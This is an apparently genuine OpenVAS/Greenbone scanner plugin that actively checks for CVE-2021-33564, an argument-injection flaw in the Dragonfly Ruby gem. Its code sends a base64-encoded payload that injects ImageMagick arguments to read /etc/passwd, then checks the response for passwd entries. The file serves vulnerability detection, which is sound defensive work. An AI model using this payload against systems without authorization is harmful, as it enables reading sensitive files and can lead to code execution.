# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.146048");
  script_version("2021-06-01T06:46:28+0000");
  script_tag(name:"last_modification", value:"2021-06-01 10:36:35 +0000 (Tue, 01 Jun 2021)");
  script_tag(name:"creation_date", value:"2021-06-01 05:13:21 +0000 (Tue, 01 Jun 2021)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2021-33564");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Dragonfly Ruby Gem < 1.4.0 Argument Injection Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl", "os_detection.nasl");
  script_mandatory_keys("Host/runs_unixoide");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Dragonfly Ruby Gem is prone to an argument injection vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"An argument injection vulnerability in the Dragonfly gem for
  Ruby allows remote attackers to read and write to arbitrary files via a crafted URL when the
  verify_url option is disabled. This may lead to code execution. The problem occurs because the
  generate and process features mishandle use of the ImageMagick convert utility.");

  script_tag(name:"affected", value:"Dragonfly Ruby Gem versions prior to 1.4.0.");

  script_tag(name:"solution", value:"Update to version 1.4.0 or later.");

  script_xref(name:"URL", value:"https://zxsecurity.co.nz/research/argunment-injection-ruby-dragonfly/");
  script_xref(name:"URL", value:"https://github.com/markevans/dragonfly/issues/513");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

foreach dir (make_list_unique("/", http_cgi_dirs(port: port))) {
  res = http_get_cache(port: port, item: dir);

  # e.g. /system/refinery/images/W1siZiIsIjIwMjEvMDEvMTEvMDgvMjgvMjEvNGM0ODY1YWMtODU2ZS00MzlhLTlhN2UtZjI0MjBiOGM5NzljL21vYmlsZS1iYW5uZXItMi5qcGciXSxbInAiLCJ0aHVtYiIsIjc1MHg2NjAjYyJdXQ/banner.jpg
  # /system/images/W1siZiIsIjIwMTgvMDkvMTgvMDMvMDUvNDYvMzUvS0FSMDExX0thcmllZ2FfTWFpbl9Mb2RnZS5qcGciXSxbInAiLCJ0aHVtYiIsIjEzMHg2NSNjIl1d/example.jpg"
  path = eregmatch(pattern: "(/system([^ ]+)?/images/)W1si", string: res);
  if (isnull(path[1]))
    exit(0);

  payload = "W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvcGFzc3dkIiwgIm91dCJdXQ==";

  if (dir == "/")
    dir = "";

  url = dir + path[1] + payload;

  if (http_vuln_check(port: port, url: url, pattern: "(root|admin|nobody):[^:]*:[0-9]+:(-2|[0-9]+):([^:]*:){2}",
                      check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
